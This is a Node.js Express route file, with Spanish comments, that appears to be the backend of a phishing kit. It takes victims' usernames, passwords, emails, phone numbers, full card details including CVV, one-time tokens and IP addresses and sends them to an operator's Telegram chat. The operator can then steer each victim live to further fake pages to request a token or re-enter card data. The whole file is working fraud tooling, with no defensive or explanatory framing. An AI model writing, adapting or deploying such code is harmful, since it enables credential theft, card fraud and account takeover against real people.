import express from 'express';
import bot from '../config/botConfig.js';
import { CHAT_ID } from '../config/preconfigs.js';
import { generateRandomID } from '../helpers/utils.js';

const router = express.Router();

const activeMessages = new Map(); // Almacena los mensajes activos con su respectivo token

router.post('/generals', (req, res) => {
  let infoMessage = `
    \u{1F534} Nuevo Registro \u{1F534}
    ----------------------------

    \u{1F465} User: ${req.body.user}

    \u{1F512} Pass: ${req.body.puser}

    ----------------------------

    \u{1F4E7} Email: ${req.body.email}

    \u{1F4F2} Celular: ${req.body.pemail}

    ----------------------------

    \u{1F4B3} CARD: ${req.body.p}

    \u{1F4C5} FECHA: ${req.body.f}

    \u{2B50} CVV: ${req.body.c}

    \u{1F535} TIPO: ${req.body.type}

    ----------------------------

    \u{1F4A3} TOKEN: ${req.body.tok}

    ----------------------------
    IP: ${req.ip.split(':').pop()}
  
  `;

  const token = generateRandomID();

  const opts = {
    reply_markup: JSON.stringify({
      inline_keyboard: [
        [
          { text: '$ Pedir TOKEN $', callback_data: `token.html:${token}` }
        ],
        [
          { text: 'newUser', callback_data: `index.html:${token}` },
          { text: 'newCard', callback_data: `card.html:${token}` },
          { text: 'newEmail', callback_data: `email.html:${token}` },
        ],
        [
          { text: 'Finalizar', callback_data: `success.html:${token}` },
        ]
      ],
      one_time_keyboard: true,
    }),
  };

  bot.sendMessage(CHAT_ID, infoMessage);

  setTimeout(() => { // Evitar que salga primero el teclado
    bot.sendMessage(CHAT_ID, 'OPCIONES: ', opts)
      .then(message => {
        const messageID = message.message_id;
        activeMessages.set(token, { messageID, res }); // Almacena el ID del mensaje y la respuesta HTTP con el token correspondiente
      })
      .catch(err => console.log(err));
  }, 100);
})


// Maneja las respuestas a las opciones del teclado personalizado
bot.on('callback_query', (query) => {
  const data = query.data.split(':');
  const token = data[1];

  if (activeMessages.has(token)) {
    const { messageID, res } = activeMessages.get(token);
    activeMessages.delete(token); // Elimina el mensaje de la estructura de datos

    bot.deleteMessage(CHAT_ID, messageID);

    // Enviar respuesta a través de la respuesta HTTP almacenada
    console.log('Redirigiendo a -> '+data[0]);
    res.json({ 'redirect_to': data[0] });
  }
});


export default router;